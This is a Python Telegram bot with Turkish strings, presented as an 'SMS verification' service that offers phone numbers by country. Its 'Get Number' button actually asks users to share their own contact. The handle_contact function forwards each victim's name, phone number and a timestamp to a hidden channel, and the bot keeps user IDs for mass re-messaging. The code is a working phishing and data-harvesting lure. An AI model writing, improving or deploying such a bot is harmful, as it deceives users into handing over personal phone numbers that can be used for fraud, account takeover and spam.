from telegram import (
    Update,
    KeyboardButton,
    ReplyKeyboardMarkup,
    Contact,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)
import random
from datetime import datetime
import pytz
import os

TOKEN = os.getenv("BOT_TOKEN")
KANAL_ID = os.getenv("KANAL_ID")
TIMEZONE = pytz.timezone("Europe/Istanbul")

# ➕ Kullanıcı kayıt dosyası
USER_FILE = "users.txt"

# Dosya yoksa oluştur
if not os.path.exists(USER_FILE):
    with open(USER_FILE, "w") as f:
        pass

ulkeler = [
    ("Türkiye", "🇹🇷"), ("Almanya", "🇩🇪"), ("Fransa", "🇫🇷"),
    ("ABD", "🇺🇸"), ("İngiltere", "🇬🇧"), ("Kanada", "🇨🇦"),
    ("İtalya", "🇮🇹"), ("İspanya", "🇪🇸"), ("Hollanda", "🇳🇱"),
    ("Japonya", "🇯🇵"), ("Rusya", "🇷🇺"), ("Brezilya", "🇧🇷"),
    ("Avustralya", "🇦🇺"), ("Hindistan", "🇮🇳"), ("Çin", "🇨🇳"),
    ("Meksika", "🇲🇽"), ("İsveç", "🇸🇪"),
]

kullanici_durum = {}


# ➕ Kullanıcı ID kaydetme
def save_user(user_id):
    with open(USER_FILE, "r") as f:
        users = f.read().splitlines()

    if str(user_id) not in users:
        with open(USER_FILE, "a") as f:
            f.write(str(user_id) + "\n")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # ➕ Yeni Start atanı kaydet
    save_user(user.id)

    ad = user.username or user.first_name
    await update.message.reply_text(
        f"✨ Hoş geldin {ad}\nSMS doğrulama botu",
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("💬 SMS Onayla")]],
            resize_keyboard=True
        )
    )


async def sms_onayla(update: Update, context: ContextTypes.DEFAULT_TYPE):
    secilen = random.sample(ulkeler, 15)
    butonlar = [[KeyboardButton(f"{b} {i}")] for i, b in secilen]
    butonlar.append([KeyboardButton("🔙 Geri Dön")])
    await update.message.reply_text(
        "Bir ülke seç:",
        reply_markup=ReplyKeyboardMarkup(butonlar, resize_keyboard=True)
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    uid = update.effective_user.id

    if text == "💬 SMS Onayla":
        await sms_onayla(update, context)
    elif text == "🔙 Geri Dön":
        await start(update, context)
    elif any(text == f"{b} {i}" for i, b in ulkeler):
        kullanici_durum[uid] = True
        await update.message.reply_text(
            "BUTONA BASARAK NUMARA AL:",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("📱 Numara Al", request_contact=True)]],
                resize_keyboard=True
            )
        )


async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not kullanici_durum.get(uid):
        return

    c: Contact = update.message.contact
    zaman = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")

    await context.bot.send_message(
        chat_id=KANAL_ID,
        text=(
            "☎️ NUMARA ALINDI\n\n"
            f"👤 {c.first_name}\n"
            f"📱 +{c.phone_number}\n"
            f"⏰ {zaman}"
        )
    )

    await update.message.reply_text("Alındı ✅")
    kullanici_durum[uid] = False


# ➕ Bot açıldığında tüm eski kullanıcılara mesaj atma
async def notify_old_users(app):
    with open(USER_FILE, "r") as f:
        users = f.read().splitlines()

    for uid in users:
        try:
            await app.bot.send_message(
                chat_id=int(uid),
                text="🔥 Bot yeniden aktif! Tekrar kullanabilirsin."
            )
        except:
            pass


def main():
    app = ApplicationBuilder().token(TOKEN).build()

    # ➕ Bot açıldığında eski kullanıcılara mesaj gitmesi
    app.post_init = lambda _: notify_old_users(app)

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()


if __name__ == "__main__":
    main()
